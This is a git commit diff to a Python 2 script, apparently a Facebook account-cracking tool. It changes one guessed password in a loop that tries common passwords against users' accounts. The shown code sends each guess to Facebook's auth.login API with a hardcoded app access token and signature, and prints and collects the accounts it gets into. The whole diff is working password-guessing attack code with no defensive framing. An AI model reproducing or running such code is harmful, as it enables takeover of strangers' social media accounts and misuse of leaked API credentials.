0df51ae58982b5284815b1ca38a02a19ba91113e
Jam302 <65140038+Jam302@users.noreply.github.com>
2020-05-20 13:14:39 +0500

    Update Mishal.py

--- Mishal.py
+++ Mishal.py
@@ -331,7 +331,7 @@ def pilih_super():
 				            print '\x1b[1;94m[•⚔•] \x1b[1;91mPassword \x1b[1;91m✯ \x1b[1;92m' + pass2 + '\n'											
 				            oks.append(user+pass2)
                                 else:
-				            pass3 = b['first_name'] + '12345'									
+				            pass3 = '786786'									
 					    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
 					    q = json.load(data)										
 					    if 'access_token' in q:	
